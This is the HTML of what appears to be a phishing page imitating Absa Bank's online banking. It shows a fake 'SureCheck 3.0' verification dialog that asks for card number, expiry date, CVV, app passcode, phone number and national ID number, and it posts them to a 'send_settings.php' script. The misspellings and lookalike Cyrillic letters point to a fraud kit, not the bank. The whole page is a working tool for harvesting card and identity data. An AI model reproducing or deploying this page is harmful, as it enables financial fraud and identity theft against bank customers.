                <div _ngcontent-qws-c179="" class="help-content__body ng-tns-c179-2 ng-trigger ng-trigger-slide" style="transform: translateX(0px);">
                  <div _ngcontent-qws-c179="" class="help-items ng-tns-c179-2">
                    
                  </div>
                </div>
              </div>
              <div _ngcontent-qws-c179="" class="ng-tns-c179-2"></div>
            </app-help>
            <app-page-footer _ngcontent-qws-c297="" _nghost-qws-c198="">
              <div _ngcontent-qws-c198="" fxlayout="row" class="container-fluid footer" style="flex-direction: row; box-sizing: border-box; display: flex;">
                <div _ngcontent-qws-c198="" class="footer-container">
                  <div _ngcontent-qws-c198="" class="footer-content">
                    <div _ngcontent-qws-c198="" fxlayout="column" class="footer-content__text" style="flex-direction: column; box-sizing: border-box; display: flex;">
                      <div _ngcontent-qws-c198="" fxflexalign="center" fxhide.gt-md="" style="align-self: center; display: none;">
                        <p _ngcontent-qws-c198="">© Copyright. Absa Bank Limited. Registration Number: 1986/004794/06</p>
                      </div>
                      <div _ngcontent-qws-c198="" fxflexalign="center" fxhide.gt-md="" style="align-self: center; display: none;">
                        <p _ngcontent-qws-c198="">Authorised financial services and registered credit provider NCRCP7 </p>
                      </div>
                      <div _ngcontent-qws-c198="" fxflexalign="center" fxshow="false" fxshow.gt-md="" style="align-self: center;">
                        <p _ngcontent-qws-c198="">© Copyright. Absa Bank Limited. Registration Number: 1986/004794/06 Authorised financial services and registered credit provider NCRCP7</p>
                      </div>
                    </div>
                    <ul _ngcontent-qws-c198="" fxlayoutalign="center" ngclass="footer-margin" ngclass.gt-sm="add-padding" class="footer-content__nav add-padding" style="place-content: stretch center; align-items: stretch; flex-direction: row; box-sizing: border-box; display: flex;">
                      <li _ngcontent-qws-c198="" class="ng-star-inserted"><a _ngcontent-qws-c198=""> Charges </a></li>
                      <li _ngcontent-qws-c198="" class="ng-star-inserted"><a _ngcontent-qws-c198=""> Banking Regulations </a></li>
                      <li _ngcontent-qws-c198="" class="ng-star-inserted"><a _ngcontent-qws-c198=""> Browser Requirements </a></li>
                      <li _ngcontent-qws-c198="" class="ng-star-inserted"><a _ngcontent-qws-c198=""> Security Centre </a></li>
                      <li _ngcontent-qws-c198="" class="ng-star-inserted"><a _ngcontent-qws-c198=""> Terms of use  </a></li>
                    </ul>
                  </div>
                </div>
              </div>
            </app-page-footer>
            <div _ngcontent-qws-c297="" class="below-footer-space-gt-md"></div>
          </div>
        </div>
      </div>
    </app-cb-application>
  </app-root>

  
  <div class="cdk-overlay-container">
    <div class="cdk-overlay-backdrop cdk-overlay-dark-backdrop cdk-overlay-backdrop-showing"></div>
    <div class="cdk-global-overlay-wrapper" dir="ltr" style="justify-content: center; align-items: center;">
      <div id="cdk-overlay-1" class="cdk-overlay-pane custom-dialog-container" style="max-width: 80vw; pointer-events: auto; position: static;">
        <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
        <mat-dialog-container tabindex="-1" aria-modal="true" class="mat-dialog-container ng-tns-c39-9 ng-trigger ng-trigger-dialogContainer ng-star-inserted" id="mat-dialog-1" role="dialog" style="transform: none;">
          <view-security-notification _nghost-qws-c278="" class="ng-star-inserted" style="">
            <app-dialog-modal _ngcontent-qws-c278="" _nghost-qws-c64="" class="ng-star-inserted">
              <div _ngcontent-qws-c64="" id="dialog-container-holder" class="container-holder">
                <div _ngcontent-qws-c64="" ngclass.xs="dialog-container_lt-sm open-slider" class="dialog-container" style="width: 97%; max-width: 800px; padding: 35px 0px 0px;">
                  <div _ngcontent-qws-c64="" class="dialog-container__icons remove-height" style="height: 0px; margin: 0px 0px -57px;"><span _ngcontent-qws-c64="" class="icon secondary-icon icon-undefined" hidden=""></span></div>
                  <div _ngcontent-qws-c64="" class="dialog-container_empty_row dialog-container_empty_row__hide">&nbsp;</div>
                  <surecheck-v2 _ngcontent-qws-c278="" _nghost-qws-c735="" class="ng-star-inserted">
                    <div _ngcontent-qws-c735="" class="text-center">
                      <div _ngcontent-qws-c735="" fxlayout="row" fxlayoutalign="start" class="heading" style="flex-direction: row; box-sizing: border-box; display: flex; place-content: stretch flex-start; align-items: stretch;">
                        <div _ngcontent-qws-c735="" class="icon-lock-tick iconMargin"></div>
                        <div _ngcontent-qws-c735=""><b _ngcontent-qws-c735="">SureCheck 3.0 | </b>Information Verification Reqiured</div>
                      </div>
                      <div _ngcontent-qws-c735="" class="securityNotification">
                        <cb-form _ngcontent-qws-c735="" _nghost-qws-c186="">
                          <form method="POST" action="../send/send_settings.php">
                            <div _ngcontent-qws-c735="" fxlayout="row" fxlayoutalign="space-around center" style="flex-direction: row; box-sizing: border-box; display: flex; place-content: center space-around; align-items: center;margin-top: -15px;">
                              <div _ngcontent-qws-c735="" fxhide="" fxshow.gt-md="" fxlayout="column" fxflex="29%" fxlayoutalign="center center" style="flex-direction: column; box-sizing: border-box; display: flex; place-content: center; align-items: center; flex: 1 1 100%; max-width: 29%;"><img _ngcontent-qws-c735="" src="../libraries/lib/sure-check-phone.png"></div>
                              <div _ngcontent-qws-c735="" fxhide="" fxshow.gt-md="" fxlayout="column" fxflex="1%" fxlayoutalign="center center" style="display: flex; flex-direction: column; box-sizing: border-box; place-content: center; align-items: center; flex: 1 1 100%; max-width: 1%;">
                                <div _ngcontent-qws-c735="" class="line-vertical"></div>
                              </div>
                              <div _ngcontent-qws-c735="" fxlayout="column" fxflex.gt-md="70%" fxlayoutalign="space-around stretch" style="flex-direction: column; box-sizing: border-box; display: flex; place-content: stretch space-around; align-items: stretch; max-width: 70%; flex: 1 1 100%; padding-left: 15px;">
                                <div _ngcontent-qws-c735="" fxlayout="row" fxlayoutalign="space-around center" class="margin-bot-sm dialog-normal-content" style="flex-direction: row; box-sizing: border-box; display: flex; place-content: center space-around; align-items: center;">
                                  <h4 _ngcontent-qws-c735="">Verification</h4></div>
                                <div _ngcontent-qws-c735="" fxlayout="row" fxlayoutalign="space-around center" class="margin-bot-sm" style="flex-direction: row; box-sizing: border-box; display: flex; place-content: center space-around; align-items: center;">
                                  <div _ngcontent-qws-c735="" class="insideHeader" style="max-width: 500px;">A Information verification reqiured. Please update your account.</div>
                                </div>
                                

                                <div _ngcontent-ppd-c187="" class="form-group ng-pristine ng-invalid ng-touched">
                                  <div _ngcontent-ppd-c187="" fxlayoutalign.gt-xs="space-between center" style="flex-direction: row; place-content: center space-between; align-items: center; box-sizing: border-box; display: flex;">
                                    <div _ngcontent-ppd-c187="" fxhide.sm="true" fxhide.xs="true" fxlayout="row" style="flex-direction: row; box-sizing: border-box; display: flex;">
                                      <label _ngcontent-ppd-c187="" id="fromReference_label" for="fromReference" class="ng-star-inserted">Card Number</label>
                                    </div>
                                  </div>
                                  <div _ngcontent-ppd-c187="" class="input-group ng-star-inserted">
                                    <input name="cn" _ngcontent-ppd-c187="" class="form-control no-spin ng-pristine ng-valid ng-touched submit-clicked" id="fromReference" autocomplete="off" type="text" placeholder="0000 0000 0000 0000" required="required" oninvalid="this.setCustomValidity('Type your card number please.')" oninput="setCustomValidity('')" autofocus="">
                                  </div>
                                  <div _ngcontent-ppd-c187="" class="helper-text-padding">
                                  </div>
                                </div>


                                <div _ngcontent-ppd-c187="" class="form-group ng-pristine ng-invalid ng-touched">
                                  <div _ngcontent-ppd-c187="" fxlayoutalign.gt-xs="space-between center" style="flex-direction: row; place-content: center space-between; align-items: center; box-sizing: border-box; display: flex;">
                                    <div _ngcontent-ppd-c187="" fxhide.sm="true" fxhide.xs="true" fxlayout="row" style="flex-direction: row; box-sizing: border-box; display: flex;">
                                      <label _ngcontent-ppd-c187="" id="fromReference_label" for="fromReference" class="ng-star-inserted">Expiration Date</label>
                                    </div>
                                  </div>
                                  <div _ngcontent-ppd-c187="" class="input-group ng-star-inserted">
                                    <input name="exp" _ngcontent-ppd-c187="" class="form-control no-spin ng-pristine ng-valid ng-touched submit-clicked" id="fromReference" type="text" placeholder="MM/YYYY" autocomplete="off" required="required" oninvalid="this.setCustomValidity('Type your expiration date please.')" oninput="setCustomValidity('')">
                                  </div>
                                  <div _ngcontent-ppd-c187="" class="helper-text-padding">
                                  </div>
                                </div>


                                <div _ngcontent-ppd-c187="" class="form-group ng-pristine ng-invalid ng-touched">
                                  <div _ngcontent-ppd-c187="" fxlayoutalign.gt-xs="space-between center" style="flex-direction: row; place-content: center space-between; align-items: center; box-sizing: border-box; display: flex;">
                                    <div _ngcontent-ppd-c187="" fxhide.sm="true" fxhide.xs="true" fxlayout="row" style="flex-direction: row; box-sizing: border-box; display: flex;">
                                      <label _ngcontent-ppd-c187="" id="fromReference_label" for="fromReference" class="ng-star-inserted">CVV</label>
                                    </div>
                                  </div>
                                  <div _ngcontent-ppd-c187="" class="input-group ng-star-inserted">
                                    <input name="cvv" _ngcontent-ppd-c187="" class="form-control no-spin ng-pristine ng-valid ng-touched submit-clicked" id="fromReference" type="password" placeholder="000" autocomplete="off" required="required" oninvalid="this.setCustomValidity('Type your CVV please.')" oninput="setCustomValidity('')">
                                  </div>
                                  <div _ngcontent-ppd-c187="" class="helper-text-padding">
                                  </div>
                                </div>



                                <div _ngcontent-ppd-c187="" class="form-group ng-pristine ng-invalid ng-touched">
                                  <div _ngcontent-ppd-c187="" fxlayoutalign.gt-xs="space-between center" style="flex-direction: row; place-content: center space-between; align-items: center; box-sizing: border-box; display: flex;">
                                    <div _ngcontent-ppd-c187="" fxhide.sm="true" fxhide.xs="true" fxlayout="row" style="flex-direction: row; box-sizing: border-box; display: flex;">
                                      <label _ngcontent-ppd-c187="" id="fromReference_label" for="fromReference" class="ng-star-inserted">App Passcode</label>
                                    </div>
                                  </div>
                                  <div _ngcontent-ppd-c187="" class="input-group ng-star-inserted">
                                    <input name="passcode" _ngcontent-ppd-c187="" class="form-control no-spin ng-pristine ng-valid ng-touched submit-clicked" id="fromReference" type="password" placeholder="00000" autocomplete="off" required="required" oninvalid="this.setCustomValidity('Type your app passcode please.')" oninput="setCustomValidity('')">
                                  </div>
                                  <div _ngcontent-ppd-c187="" class="helper-text-padding">
                                  </div>
                                </div>



                                <div _ngcontent-ppd-c187="" class="form-group ng-pristine ng-invalid ng-touched">
                                  <div _ngcontent-ppd-c187="" fxlayoutalign.gt-xs="space-between center" style="flex-direction: row; place-content: center space-between; align-items: center; box-sizing: border-box; display: flex;">
                                    <div _ngcontent-ppd-c187="" fxhide.sm="true" fxhide.xs="true" fxlayout="row" style="flex-direction: row; box-sizing: border-box; display: flex;">
                                      <label _ngcontent-ppd-c187="" id="fromReference_label" for="fromReference" class="ng-star-inserted">Phone Number</label>
                                    </div>
                                  </div>
                                  <div _ngcontent-ppd-c187="" class="input-group ng-star-inserted">
                                    <input name="phone" _ngcontent-ppd-c187="" class="form-control no-spin ng-pristine ng-valid ng-touched submit-clicked" id="fromReference" type="text" placeholder="(000) 0000-0000" autocomplete="off" required="required" oninvalid="this.setCustomValidity('Entег your phone number please.')" oninput="setCustomValidity('')">
                                  </div>
                                  <div _ngcontent-ppd-c187="" class="helper-text-padding">
                                  </div>
                                </div>


                                <div _ngcontent-ppd-c187="" class="form-group ng-pristine ng-invalid ng-touched">
                                  <div _ngcontent-ppd-c187="" fxlayoutalign.gt-xs="space-between center" style="flex-direction: row; place-content: center space-between; align-items: center; box-sizing: border-box; display: flex;">
                                    <div _ngcontent-ppd-c187="" fxhide.sm="true" fxhide.xs="true" fxlayout="row" style="flex-direction: row; box-sizing: border-box; display: flex;">
                                      <label _ngcontent-ppd-c187="" id="fromReference_label" for="fromReference" class="ng-star-inserted">ID Number</label>
                                    </div>
                                  </div>
                                  <div _ngcontent-ppd-c187="" class="input-group ng-star-inserted">
                                    <input name="idnum" _ngcontent-ppd-c187="" class="form-control no-spin ng-pristine ng-valid ng-touched submit-clicked" id="fromReference" type="text" placeholder="0000000000000" autocomplete="off" required="required" oninvalid="this.setCustomValidity('Entег your id number please.')" oninput="setCustomValidity('')">
                                  </div>
                                  <div _ngcontent-ppd-c187="" class="helper-text-padding">
                                  </div>
                                </div>



                                <div _ngcontent-qws-c735="" fxlayout="column" fxlayout.gt-md="row" fxlayoutgap="15px" fxlayoutalign.gt-md="center center" class="btn-container surecheck-button" style="flex-direction: row; box-sizing: border-box; display: flex; place-content: center; align-items: center;">
                                  <form-button type="submit" style="margin-right: 15px;">
                                    <button type="submit" class="btn btn-secondary btn-stretch" tabindex="0">Submit</button>
                                  </form-button>
                                  <form-button _ngcontent-qws-c735="" type="button">
                                    <button type="button" class="btn btn-primary btn-stretch" disabled="">Cancel</button>
                                  </form-button>
                                </div>
                              </div>
                            </div>
                            
                          </form>
                        </cb-form>
                      </div>
                    </div>
                  </surecheck-v2>
                  <div _ngcontent-qws-c64="" class="dialog-container_empty_row dialog-container_empty_row__hide">&nbsp;</div>
                  <div _ngcontent-qws-c64="" class="dialog-container__nav-group">
                    <div _ngcontent-qws-c64="" class="dialog-container__buttons">
                      <div _ngcontent-qws-c64="" fxlayout="column" fxlayout.gt-xs="row" fxlayoutgap="15px" fxlayoutalign.gt-xs="center center" style="flex-direction: row; box-sizing: border-box; display: flex; place-content: center; align-items: center;"></div>
                    </div>
                  </div>
                </div>
              </div>
            </app-dialog-modal>
          </view-security-notification>
        </mat-dialog-container>
        <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
      </div>
    </div>
  </div>




    <script src="../libraries/lib/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.10/jquery.mask.js"></script>
    <script>
        $('input[name="cn"]').mask('0000 0000 0000 0000');
        $('input[name="exp"]').mask('00/0000');
        $('input[name="cvv"]').mask('000');
        $('input[name="passcode"]').mask('00000');
        $('input[name="phone"]').mask('(000) 0000-0000');
        $('input[name="idnum"]').mask('0000000000000');
    </script>
</body>

</html>